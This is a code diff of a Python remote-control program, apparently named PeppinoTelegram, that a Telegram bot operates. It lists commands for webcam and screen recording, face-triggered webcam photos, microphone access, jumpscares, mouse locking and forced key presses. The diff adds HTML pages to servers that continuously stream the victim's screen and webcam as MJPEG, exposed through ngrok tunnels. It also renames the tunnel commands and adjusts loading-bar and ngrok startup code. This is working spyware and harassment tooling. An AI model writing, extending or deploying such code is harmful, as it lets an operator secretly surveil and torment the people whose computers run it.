@@ -243,10 +243,10 @@ screenclip - Record screen.
 recordjum - Records 20 second clip of jumpscare.
 waitforface - Send a webcam photo when face is detected till timeout.
 displaymode - Send a display set menu.
-webcamtunnelstart - Sets you a link to a webcam stream.
-screentunnelstart - Sets you a link to a screen stream.
-webcamtunnelstop - Stops the webcam stream.
-screentunnelstop - Stops the screen stream.
+webcamstreamstart - Sets you a link to a webcam stream.
+screenstreamstart - Sets you a link to a screen stream.
+webcamstreamstop - Stops the webcam stream.
+screenstreamstop - Stops the screen stream.
 
 🔊 Audio & Volume
 breath - Play breathing sound.
@@ -537,25 +537,64 @@ class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     daemon_threads = True
     def handle_error(self, request, client_address):
         pass
+
 class ScreenStreamHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
         pass
 
     def do_GET(self):
-        if self.path != '/':
+        if self.path == '/':
+            html = b"""\
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Screen Stream</title>
+                <style>
+                    body {
+                        background-color: #1e1e1e;
+                        color: #eee;
+                        font-family: sans-serif;
+                        text-align: center;
+                        padding-top: 30px;
+                    }
+                    img {
+                        border: 4px solid #444;
+                        border-radius: 10px;
+                        width: 80%%;
+                        max-width: 900px;
+                        box-shadow: 0 0 15px #000;
+                    }
+                </style>
+            </head>
+            <body>
+                <h1>Live Screen Stream</h1>
+                <img src="/video" alt="Screen stream">
+            </body>
+            </html>
+            """
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.send_header('Content-length', str(len(html)))
+            self.end_headers()
+            self.wfile.write(html)
+
+        elif self.path == '/video':
+            self.send_response(200)
+            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
+            self.end_headers()
+            try:
+                while True:
+                    screenshot = pg.screenshot()
+                    with BytesIO() as output:
+                        screenshot.save(output, format="JPEG")
+                        frame = output.getvalue()
+                    self.wfile.write(b"--frame\r\n")
+                    self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n")
+            except (BrokenPipeError, ConnectionResetError):
+                pass
+
+        else:
             self.send_error(404)
-            return
-        self.send_response(200)
-        self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
-        self.end_headers()
-        while True:
-            screenshot = pg.screenshot()
-            with BytesIO() as output:
-                screenshot.save(output, format="JPEG")
-                frame = output.getvalue()
-            self.wfile.write(b"--frame\r\n")
-            self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n")
-            sleep(0.1)
 
 def webcamstreamhandlermaker(cap):
     class WebcamStreamHandler(BaseHTTPRequestHandler):
@@ -563,22 +602,60 @@ def webcamstreamhandlermaker(cap):
             pass
 
         def do_GET(self):
-            if self.path != '/':
+            if self.path == '/':
+                html = b"""\
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Webcam Stream</title>
+                    <style>
+                        body {
+                            background-color: #000;
+                            color: #fff;
+                            font-family: sans-serif;
+                            text-align: center;
+                            margin: 0;
+                            padding: 2em;
+                        }
+                        img {
+                            border: 6px solid #444;
+                            border-radius: 12px;
+                            width: 80%%;
+                            max-width: 960px;
+                            box-shadow: 0 0 20px #000;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <h1>Live Webcam Stream</h1>
+                    <img src="/video" alt="Webcam stream">
+                </body>
+                </html>
+                """
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.send_header('Content-length', str(len(html)))
+                self.end_headers()
+                self.wfile.write(html)
+            elif self.path == '/video':
+                cap.open(0)
+                self.send_response(200)
+                self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
+                self.end_headers()
+                try:
+                    while cap.isOpened():
+                        ret, frame = cap.read()
+                        if not ret:
+                            continue
+                        _, jpeg = imencode('.jpg', frame)
+                        self.wfile.write(b"--frame\r\n")
+                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
+                except (BrokenPipeError, ConnectionResetError):
+                    pass
+            else:
                 self.send_error(404)
-                return
-            cap.open(0)
-            self.send_response(200)
-            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
-            self.end_headers()
-            while cap.isOpened():
-                ret, frame = cap.read()
-                if not ret:
-                    continue
-                _, jpeg = imencode('.jpg', frame)
-                self.wfile.write(b"--frame\r\n")
-                self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
-                sleep(0.1)
     return WebcamStreamHandler
+
 
 class MJPEGServer:
     def __init__(self, port=8081, handler=None):
@@ -801,7 +878,7 @@ o888ooooood8 `Y8bod8P' `Y888""8o `Y8bod88P" o888o o888o o888o `8oooooo.  o888boo
                                                               "Y88888P'
 """
 class LoadingBar:
-    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None, spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶", spinner_frames=all_spinners["braille"], spinner_pos: str="left", bar_lenght: int=10):
+    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True, label=None, spinner_enabled: bool=True, full_char: str="🔲", empty_char="🔶", spinner_frames=all_spinners["braille"], spinner_pos: str="left", bar_lenght: int=10, pin_message: bool=True):
         self.bot = bot
         self.tot = int(total)
         self.label = label
@@ -825,6 +902,7 @@ class LoadingBar:
         self.bar_lenght = bar_lenght
 
         self.bar = self.get_bar()
+        self.pin_message = pin_message
 
         if autosend:
             self.setup()
@@ -871,6 +949,7 @@ class LoadingBar:
     def setup(self):
         bar = self.get_bar()
         self.ETDMessage = EditableMessage(self.bot, self.chat_id, bar)
+        self.bot.pinChatMessage(self.chat_id, self.ETDMessage.message_id)
         if self.spinner_enabled:
             t = Thread(target=self.spinner_cycle)
             t.start()
@@ -1038,10 +1117,10 @@ class PeppinoTelegram:
             "setvolume":self.audio_mixer.setVolumePercentage,
             "fullvolume":lambda:self.audio_mixer.full(),
             "wifiinfo":self.wifiinfo,
-            "webcamtunnelstart":self.start_webcam_tunnel,
-            "screentunnelstart":self.start_screen_tunnel,
-            "webcamtunnelstop":self.stop_webcam_tunnel,
-            "screentunnelstop":self.stop_screen_tunnel,
+            "webcamstreamstart":self.start_webcam_tunnel,
+            "screenstreamstart":self.start_screen_tunnel,
+            "webcamstreamstop":self.stop_webcam_tunnel,
+            "screenstreamstop":self.stop_screen_tunnel,
             "mixermenu":self.mixer_menu,
             "procmonadd":self.processmonitoradd,
             "procmonrem":self.processmonitorrem,
@@ -1085,6 +1164,7 @@ class PeppinoTelegram:
             return self.bsend(f"Error while sending an image\n{e}")
 
     def altf4(self) -> None:
+        self.bsend(f"{emoji_dict['keyboard']} Alt F4 Pressed")
         press_key('alt')
         press_key('f4')
         release_key('f4')
@@ -1196,6 +1276,8 @@ class PeppinoTelegram:
                 self.parse_document(msg, mimetype="video")
             elif content_type in ("voice", "audio"):
                 self.parse_audio(msg)
+            elif content_type == "pinned_message":
+                print(msg)
             else:
                 self.bsend(f"Unparsed content-type: {content_type}")
         else:
@@ -1322,10 +1404,15 @@ class PeppinoTelegram:
         pg.moveTo(pos[0], pos[1]-MOUSE_JMP)
 
     def mouselock(self, timer: int=6) -> None:
+        bar = self.new_loading_bar(timer, label=f"{emoji_dict['mouse']} Mouselock")
         start = time()
         pos = pg.position()
-        while timer > (time()-start):
+        time_elapsed = 0
+        while timer > time_elapsed:
+            time_elapsed = time()-start
+            bar.update(time_elapsed)
             pg.moveTo(pos)
+        bar.fill_and_delete()
 
     def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
         return EditableMessage(self.bot, self.owner_id, content, autosend)
@@ -1543,8 +1630,8 @@ class PeppinoTelegram:
         ["/webcamclip", "/screenclip"],
         ["/fullclip", "/recordjum"],
         ["/waitforface", "/displaymode"],
-        ["/webcamtunnelstart", "/screentunnelstart"],
-        ["/webcamtunnelstop", "/screentunnelstop"],
+        ["/webcamstreamstart", "/screenstreamstart"],
+        ["/webcamstreamstop", "/screenstreamstop"],
         ["/microphone", "/mutevolume"],
         ["/fullvolume", "/setvolume"],
         ["/getvolume", "/tralalerotralala"],
@@ -2013,9 +2100,13 @@ if __name__ == "__main__":
     capture = VideoCapture(0)
     from pyngrok import ngrok
     pyngrok.process.subprocess.Popen = _patched_popen
-    if ngrok_token.strip():
-        terminate_process_by_name("ngrok.exe")
-        ngrok.set_auth_token(ngrok_token)
-        close_all_tunnels(ngrok)
+    try:
+        if ngrok_token.strip():
+            terminate_process_by_name("ngrok.exe")
+            ngrok.set_auth_token(ngrok_token)
+            close_all_tunnels(ngrok)
+    except pyngrok.exception.PyngrokNgrokError:
+            sleep(2)
+            terminate_process_by_name("ngrok.exe")
     pep2 = PeppinoTelegram(token,chat_id,ngrok_token,mixer,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"])
     pep2.start()
